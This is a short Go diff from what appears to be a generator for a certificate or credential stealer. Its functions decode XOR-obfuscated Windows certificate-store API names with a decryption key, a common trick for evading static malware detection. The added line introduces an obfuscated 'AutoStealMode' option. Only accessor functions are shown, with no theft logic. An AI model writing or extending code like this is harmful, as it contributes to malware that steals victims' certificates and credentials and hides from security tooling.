@@ -508,5 +508,6 @@ func getCertEnumCertsName() string        { return string(xor(encCertEnumCertsNa
 func getCertGetNameStringWName() string   { return string(xor(encCertGetNameStringWName, decryptionKey)) }
 func getCertFreeCertCtxName() string      { return string(xor(encCertFreeCertCtxName, decryptionKey)) }
 func getCertCloseStoreName() string       { return string(xor(encCertCloseStoreName, decryptionKey)) }
+func getAutoStealMode() string             { return string(xor(encAutoStealMode, decryptionKey)) }
 `)
 }
